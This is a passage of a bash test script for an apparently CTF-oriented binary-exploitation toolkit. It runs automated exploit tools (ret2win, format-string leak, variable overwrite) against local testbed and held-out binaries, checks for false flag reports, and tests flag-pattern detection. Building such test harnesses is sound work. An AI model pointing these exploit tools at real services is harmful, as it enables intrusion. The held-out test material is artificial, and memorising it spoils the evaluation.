# It had 11 commands starting `python3 scripts/...` - the OLD directory, which has an older
# solve.py and no fmtpwn.py or go.py. Followed literally, the exam-day reference ran stale tools.
"$PY" - <<'PYDOC' && ok "RUNBOOK: no stale scripts/ paths, every command names a file in this folder, sections in order" || bad "RUNBOOK drifted"
import os, re
r = open("RUNBOOK.md").read()
assert "python3 scripts/" not in r and "bash scripts/" not in r, "stale scripts/ path"
missing = sorted({m.group(2) for m in re.finditer(r"(python3|bash) ([a-z_0-9]+\.(?:py|sh))", r) if not os.path.isfile(m.group(2))})
assert not missing, missing
heads = [h for h in re.findall(r"(?m)^## (\S+)", r)]
want = ["00.", "0.", "The", "1.", "1c.", "1d.", "1e.", "1f.", "2."]
assert heads[:len(want)] == want, heads[:len(want)]
PYDOC

say "NEGATIVE: the new engine must not invent a flag"
# An ordinary overflow service with no format-string bug: fmtpwn must exit non-zero and
# print no flag line, however many flag-shaped strings the shared flags/ directory holds.
P=$(srv randbanner32 35051); waitport 35051
t0=$(date +%s)
out=$(timeout 60 "$PY" fmtpwn.py 127.0.0.1 35051 --binary testbed/randbanner32 --budget 20 2>&1); rc=$?
{ [ "$rc" = 1 ] && ! printf '%s' "$out" | grep -q '^\[+\] FLAG'; } \
  && ok "fmtpwn reports no flag on a service with no format bug (exit $rc)" || bad "fmtpwn false positive / did not stop (exit $rc)"
# ...and says so quickly. It once ran for minutes here, straight through --budget.
[ $(( $(date +%s) - t0 )) -le 25 ] && ok "fmtpwn gives up inside its budget when there is no format bug" \
  || bad "fmtpwn overran its budget ($(( $(date +%s) - t0 ))s for --budget 20)"
stop "$P"
# A shell-spawning win lists every flag it printed rather than presenting the first as THE flag.
P=$(srv shellwin32 35052); waitport 35052
timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 35052 --binary testbed/shellwin32 --goal ret2win 2>/dev/null \
  | grep -a '^\[+\] FLAG' | head -1 | grep -q "ONE OF [0-9]* in this reply" \
  && ok "a globbed shell reply: the FLAG headline itself says it is one of several" || bad "ambiguous flags not disclosed on the headline"
stop "$P"
reap

say "flag formats"
for t in 'ehCTF{a_b}:ehCTF{a_b}' 'SIT{x}:SIT{x}' 'the flag is zz9x:zz9x'; do
  IFS=: read -r in want <<<"$t"
  echo "$in" | "$PY" flags.py 2>/dev/null | grep -q "$want" && ok "detects $want" || bad "missed $want"
done
printf 'junk AAAAAAAAAAAAAAAA junk\n' | "$PY" flags.py 2>/dev/null | grep -q "AAAA" \
  && bad "echoed padding matched as flag" || ok "rejects repetitive echo"

if [ "$FULL" = 1 ] && [ -f ../sandbox/h1_ret2win32 ]; then
  say "held-out clones (../sandbox, read-only)"
  # read-only: never build or modify anything outside script/
  hv(){ P=$("$PY" testbed/server.py "../sandbox/$2" --port "$3" --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!); waitport "$3"
        timeout 150 "$PY" "$4" --host 127.0.0.1 --port "$3" ${5:-} 2>/dev/null | tr -d '\0' | grep -q "$6" \
          && ok "$1" || bad "$1"; stop "$P"; }
  hv "h1 ret2win32" h1_ret2win32 18411 auto_pwn.py "--binary ../sandbox/h1_ret2win32 --goal auto" "FLAG{h3ld_0ut_1"
  hv "h3 var32"     h3_var32     18412 auto_pwn.py "--binary ../sandbox/h3_var32 --goal var"     "FLAG{h3ld_0ut_3"
  hv "h4 fmt64"     h4_fmt64     18413 auto_pwn.py "--binary ../sandbox/h4_fmt64 --mode fmt --goal fmt-leak --arch amd64" "flag{h3ld_0ut_4"
fi

echo
if [ "$FAILED" -eq 0 ]; then printf '\033[1;32mALL CHECKS PASSED\033[0m\n'; exit 0
else printf '\033[1;31mSOME CHECKS FAILED\033[0m\n'; exit 1; fi

# A failing row is not automatically a defect. This suite now runs ~110 rows over ~15
# minutes and several rows are timing-sensitive (canary brute force, PIE partial overwrite,
# two-stage ret2libc, anything with a per-candidate cap). Under cumulative load - or with
# stale servers from an earlier run still alive - those can exceed their cap and report a
# false failure. Four times in one session a row failed here and passed 2/2 standalone with
# no code change.
#
# So: re-run a single failing row on its own before believing it.
#     source testbed/launch.sh
#     read -r PID PORT <<< "$(tb_launch <clone>)"
#     python3 solve.py 127.0.0.1 "$PORT" --binary testbed/<clone> --run
#     tb_stop "$PID"
